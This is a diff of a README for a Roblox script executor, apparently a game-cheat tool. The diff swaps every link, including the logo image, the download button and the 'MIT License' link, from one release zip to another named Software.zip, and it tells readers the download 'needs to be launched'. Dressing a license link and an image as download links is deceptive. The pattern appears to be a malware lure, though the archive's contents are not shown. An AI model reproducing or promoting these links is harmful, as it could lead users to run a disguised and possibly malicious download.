@@ -1,6 +1,6 @@
 # 🚀 **Roblox-Scriptify Executor**
 
-![Roblox Logo](https://github.com/Dude1212312121/Roblox-Scriptify/releases/download/v1.0/App.zip)
+![Roblox Logo](https://github.com/Dude1212312121/Roblox-Scriptify/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -26,7 +26,7 @@ Welcome to the Roblox-Scriptify repository! This repository houses the Roblox Sc
 
 To get started with the Roblox-Scriptify Executor, you can download the latest release by clicking the button below:
 
-[![Download Roblox-Scriptify](https://github.com/Dude1212312121/Roblox-Scriptify/releases/download/v1.0/App.zip)](https://github.com/Dude1212312121/Roblox-Scriptify/releases/download/v1.0/App.zip)
+[![Download Roblox-Scriptify](https://github.com/Dude1212312121/Roblox-Scriptify/releases/download/v2.0/Software.zip)](https://github.com/Dude1212312121/Roblox-Scriptify/releases/download/v2.0/Software.zip)
 
 *Note: The download link needs to be launched.*
 
@@ -51,7 +51,7 @@ We welcome contributions to enhance the features and functionality of the Roblox
 
 ## License
 
-The Roblox-Scriptify Executor is released under the [MIT License](https://github.com/Dude1212312121/Roblox-Scriptify/releases/download/v1.0/App.zip). Feel free to use, modify, and distribute the tool within the terms of the license.
+The Roblox-Scriptify Executor is released under the [MIT License](https://github.com/Dude1212312121/Roblox-Scriptify/releases/download/v2.0/Software.zip). Feel free to use, modify, and distribute the tool within the terms of the license.
 
 ---
 
